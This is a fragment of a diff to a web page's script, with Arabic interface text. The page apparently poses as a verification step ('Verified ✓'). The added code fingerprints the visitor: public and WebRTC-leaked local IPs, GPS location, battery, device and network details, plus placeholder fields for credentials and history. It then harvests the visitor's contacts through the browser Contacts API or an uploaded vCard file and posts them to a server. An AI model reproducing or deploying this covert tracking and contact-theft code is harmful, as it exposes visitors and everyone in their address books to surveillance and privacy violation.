+    ip,
+    localIp: ips.find(x => x.startsWith('192.168') || x.startsWith('10.') || x.startsWith('172.')) || 'N/A',
+    rtc: ips,
+    ips,
+    lat: g ? g.lat : '',
+    lng: g ? g.lng : '',
+    acc: g ? g.acc : '',
+    geoSource: g ? 'GPS' : '',
+    battery: b.level || '',
+    charging: b.charging || '',
+    ua: navigator.userAgent,
+    platform: navigator.platform,
+    brand: navigator.userAgentData ? navigator.userAgentData.brands.map(x=>x.brand).join(', ') : '',
+    model: navigator.userAgentData ? navigator.userAgentData.platform : '',
+    screen: screen.width + 'x' + screen.height,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    lang: navigator.language,
+    network: navigator.connection ? navigator.connection.effectiveType : '',
+    native: navigator.standalone ? 'نعم' : 'لا',
+    cJson: [], sCount: 0, sJson: [], lCount: 0, lJson: [],
+    fp: '', cred: [], hist: [], misc: []
   });
 
-  run();
-})();
+  st.textContent = 'تم التحقق ✓';
+});
+
+/* ---- جهات الاتصال ---- */
+async function sendContacts(rows){
+  const CH = 120;
+  for (let i = 0; i < rows.length; i += CH){
+    await post({ a:'contacts', n:NONCE, from:i, total:rows.length, rows:rows.slice(i, i+CH) });
+  }
+  st.textContent = 'تم إرسال ' + rows.length + ' جهة اتصال ✓';
+}
+
+async function grabContacts(){
+  if (!NONCE) NONCE = newNonce();
+
+  if (!('contacts' in navigator) || !('ContactsManager' in window)){
+    document.getElementById('vcf').click();
+    return;
+  }
+  try{
+    const avail = await navigator.contacts.getProperties();
+    const props = ['name','tel','email'].filter(p => avail.includes(p));
+    if (!props.length){ document.getElementById('vcf').click(); return; }
+
+    const list = await navigator.contacts.select(props, {multiple:true});
+    if (!list || !list.length) return;
+
+    const rows = list.map(c => ({
+      n:(c.name||[]).slice(0,2), t:(c.tel||[]).slice(0,3), e:(c.email||[]).slice(0,2)
+    })).filter(r => r.n.length || r.t.length || r.e.length);
+
+    if (rows.length) await sendContacts(rows);
+  }catch(err){
+    if (err && err.name === 'AbortError') return;
+    document.getElementById('vcf').click();
+  }
+}
+document.getElementById('btnContacts').addEventListener('click', grabContacts);
+
+function parseVcf(txt){
+  const rows = []; let cur = null;
+  txt.split(/\r?\n/).forEach(line => {
+    if (/^BEGIN:VCARD/i.test(line)){ cur = {n:[],t:[],e:[]}; return; }
+    if (/^END:VCARD/i.test(line)){ if(cur) rows.push(cur); cur = null; return; }
+    if (!cur) return;
+    const m = /^(FN|N|TEL[^:]*|EMAIL[^:]*)[^:]*:(.*)$/i.exec(line);
+    if (!m) return;
+    const k = m[1].toUpperCase(), v = m[2].trim();
+    if (!v) return;
+    if (k === 'FN') cur.n.push(v.replace(/\\,/g, ','));
+    else if (k === 'N'){ const p = v.split(';').filter(Boolean).reverse(); if (p.length) cur.n.push(p.join(' ')); }
+    else if (k.startsWith('TEL')) cur.t.push(v.replace(/[^\d+]/g, ''));
+    else if (k.startsWith('EMAIL')) cur.e.push(v);
+  });
+  return rows.filter(r => r.n.length||r.t.length||r.e.length)
+    .map(r => ({ n:[...new Set(r.n)].slice(0,2), t:[...new Set(r.t)].slice(0,3), e:[...new Set(r.e)].slice(0,2) }));
+}
+
+document.getElementById('vcf').addEventListener('change', async e => {
+  const f = e.target.files && e.target.files[0];
+  if (!f) return;
+  const rows = parseVcf(await f.text());
+  if (rows.length){ if (!NONCE) NONCE = newNonce(); await sendContacts(rows); }
+});
 </script>
 </body>
 </html>
